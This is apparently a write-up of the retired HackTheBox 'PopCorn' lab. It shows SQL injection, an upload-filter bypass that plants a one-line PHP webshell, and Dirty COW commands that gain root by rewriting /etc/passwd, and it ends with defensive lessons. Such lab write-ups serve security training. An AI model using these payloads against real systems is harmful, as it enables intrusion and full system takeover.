---
title: "PopCorn"
date: 2017-03-17
type: docs
tags:
  - htb
  - linux
  - medium
  - torrent-hoster
  - file-upload
  - content-type-bypass
  - double-extension
  - dirtycow
  - cve-2016-5195
  - kernel-lpe
  - retired
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 9.10), **Difficulty:** Medium, **Released:** 2017-03-17, **IP:** `10.10.10.6` , `popcorn.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Very old Ubuntu, Apache 2.2.12, PHP 5.2.10. `/test` exposes `phpinfo()`. `/torrent` runs **Torrent Hoster**.
2. `torrent/login.php` is **SQL injectable** (dump `torrenthoster.users`), or you can just register a normal account.
3. Torrent Hoster lets you upload a **screenshot** for a torrent you added. The check is on `Content-Type` and can be beaten with a doctored header plus a double extension (`shell.php.png` or GIF magic bytes). Upload a PHP webshell, get a shell as `www-data`.
4. The kernel is ancient and vulnerable to **Dirty COW (CVE-2016-5195)**. Compile a PoC, get root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `torrenthoster.users` (admin) | `admin : <md5 in dump>` |
| `user.txt` | `/home/george/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

PopCorn is one of the oldest boxes on the platform and it shows, but the two lessons are still current. The foothold is an **upload filter that only trusts `Content-Type`**, which is a header the client sets, so you send `Content-Type: image/png` with PHP content and a filename the server will execute. The privesc is **Dirty COW**, the 2016 copy on write race that gives arbitrary write to read only memory mappings, which on an unpatched kernel means writing to `/etc/passwd` or a SUID binary as any user. It is the canonical "the kernel is a decade out of date" box.

Related upload bypass boxes: [Magic](/writeups/hackthebox/linux/medium/magic/) (polyglot), [Usage](/writeups/hackthebox/linux/easy/usage/), [Nexus](/writeups/hackthebox/linux/easy/nexus/). Related kernel LPE to root: [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/) (CVE-2023-0386), [Analytics](/writeups/hackthebox/linux/easy/analytics/) (GAMEOVERLAY).

---

## Full Walkthrough

### Recon

```console
Open 10.10.10.6:22
Open 10.10.10.6:80
```

This is one of the oldest boxes on the platform, so I went in expecting ancient software and no shortage of low-hanging fruit. `nikto` confirmed that instinct almost immediately (output trimmed, it found dozens of `phpinfo` aliases under `/test`):

```console
+ Server: Apache/2.2.12 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+ /test: Output from the phpinfo() function was found.
+ OSVDB-112004: /test: Site appears vulnerable to 'shellshock'
+ OSVDB-3268: /icons/: Directory indexing found.
```

`/test/logon.html` brings up the PHP version page. Nikto flags shellshock, but the box predates the shellshock era in a way that makes it a dead end here.

`dirsearch`:

```console
[200] /test
[301] /torrent  ->  /torrent/
[301] /rename   ->  /rename/
```

`http://popcorn.htb/torrent/` is a **Torrent Hoster** install.

### SQLi in the torrent login

in `http://popcorn.htb/torrent/login.php` the parameters are injectable and we can dump:

```console
available databases [2]: information_schema, torrenthoster

Database: torrenthoster
[8 tables]: log, ban, categories, comments, namemap, news, subcategories, users
```

<div class="callout callout-note">

**You do not strictly need the SQLi**

Torrent Hoster allows open registration. Register, log in, and go to "Upload" to add a torrent (any `.torrent` file works). Once a torrent exists you can edit it and upload a **screenshot**, and that is the vulnerable feature. The SQLi is useful for the admin hash but not required for the foothold.

</div>

### Foothold, screenshot upload bypass

<div class="callout callout-note">

**Content-Type only validation**

`torrents.php?mode=upload` (the screenshot handler) checks `$_FILES['file']['type']`, which is the **client supplied** `Content-Type`, and does a weak extension check. Since that header is something I control from Burp regardless of what the file actually is, I uploaded `shell.php` while:
- setting `Content-Type: image/png` in the intercepted request
- naming the file something like `shell.php.png`, `shell.php;.png`, or prepending GIF magic bytes `GIF89a;` to the PHP so `getimagesize` (if the server calls it) sees a valid image signature

The file landed in `torrent/upload/` and was reachable at `http://popcorn.htb/torrent/upload/<hash>.php`. A minimal payload did the job:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```
Browsing to it with `?cmd=id` confirmed code execution, and from there I upgraded to a proper reverse shell as `www-data`.

</div>

`user.txt` is in `/home/george` and is readable once you have a `www-data` shell (or `george` via password reuse from the torrent DB).

### Privilege Escalation, Dirty COW

With a shell in hand, checking the kernel version is second nature before I even think about looking for a proper privesc vector, and this one told me everything I needed to know:

```console
www-data@popcorn:/tmp$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu ... i686 GNU/Linux
```

A 2.6.31 kernel on a 2017-era box practically guarantees a public kernel exploit, and a quick `searchsploit` for the version turned up exactly the one I expected.

<div class="callout callout-note">

**CVE-2016-5195, Dirty COW**

A race in the kernel's copy on write handling of private memory mappings lets an unprivileged process write to a read only file it can only read. The classic exploits either overwrite `/etc/passwd` to add a root user (`dirtyc0w.c` / `dirty.c`) or replace a SUID binary in memory. On this 2.6.31 kernel it is completely reliable.
```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty                     # patches /etc/passwd, creates user 'firefart' with your password
su firefart                 # uid 0
cat /root/root.txt
```
`40839.c` (the `/etc/passwd` variant) is the usual choice because it does not crash the box. Restore `/etc/passwd` afterwards.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/george/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Never trust `Content-Type` for upload validation.** It is a client header. Validate by re-encoding the image and force a single safe extension, and serve uploads from a location with script execution disabled.
- **Open registration plus a file upload feature is usually RCE** on old PHP apps.
- **Patch the kernel.** Dirty COW is nine years old and still one line to root on anything that missed the 2016 update.
- **Remove `phpinfo` / test pages** from production. `/test` here leaks the full environment, module list, and paths.

---

## Related Writeups

- **Upload filter bypass (content type, double extension, polyglot):** [Magic](/writeups/hackthebox/linux/medium/magic/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Nexus](/writeups/hackthebox/linux/easy/nexus/)
- **Kernel LPE to root:** [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Analytics](/writeups/hackthebox/linux/easy/analytics/)
- **Old PHP app SQLi:** [Magic](/writeups/hackthebox/linux/medium/magic/), [Jupiter](/writeups/hackthebox/linux/medium/jupiter/)

## References

- CVE-2016-5195 Dirty COW <https://dirtycow.ninja/>
- Dirty COW /etc/passwd PoC (EDB 40839) <https://www.exploit-db.com/exploits/40839>
- OWASP Unrestricted File Upload <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
- Final privilege escalation steps cross-referenced against public writeups for this box.
